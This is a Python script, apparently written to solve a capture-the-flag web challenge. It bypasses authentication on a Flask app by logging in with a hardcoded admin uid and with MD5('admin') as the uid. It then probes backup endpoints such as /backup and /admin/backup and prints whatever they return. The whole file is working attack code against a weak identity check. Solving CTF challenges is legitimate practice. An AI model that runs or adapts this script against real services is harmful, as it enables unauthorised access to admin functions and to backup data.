import requests
import hashlib
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞测试")
print(f"[*] Target: {BASE_URL}")
print()

# 方法1: GET 登录后访问备份
print("[*]方法1: GET 登录后访问备份")

uid = "3553c1effa0b4698895a4874cfbd86d8"  # ADMiN

login_resp = session.get(f"{BASE_URL}/", params={"uid": uid})
print(f"Login Status: {login_resp.status_code}")

# 尝试各种备份路径
backup_paths = [
    "/backup",
    "/admin/backup",
    "/api/backup",
    "/user/backup",
]

for path in backup_paths:
    backup_resp = session.get(f"{BASE_URL}{path}")
    if backup_resp.status_code != 404:
        print(f"[+] {path}: {backup_resp.status_code}")
        print(backup_resp.text[:500])

print()

# 方法2: POST /login
print("[*] 方法2: POST /login")

login_resp = session.post(f"{BASE_URL}/login", data={"uid": uid})
print(f"POST /login: {login_resp.status_code}")

if login_resp.status_code == 200:
    print("[+] 响应:")
    print(login_resp.text[:500])
    
    # 尝试访问备份
    for path in backup_paths:
        backup_resp = session.get(f"{BASE_URL}{path}")
        if backup_resp.status_code != 404:
            print(f"[+] {path}: {backup_resp.status_code}")
            print(backup_resp.text[:500])

print()

# 方法3: 尝试用 MD5('admin')
print("[*] 方法3: MD5('admin')")

admin_uid = hashlib.md5("admin".encode()).hexdigest()
print(f"MD5('admin') = {admin_uid}")

login_resp = session.get(f"{BASE_URL}/", params={"uid": admin_uid})
print(f"Login Status: {login_resp.status_code}")

for path in backup_paths:
    backup_resp = session.get(f"{BASE_URL}{path}")
    if backup_resp.status_code != 404:
        print(f"[+] {path}: {backup_resp.status_code}")
        print(backup_resp.text[:500])

print()

print("[*] 测试完成")
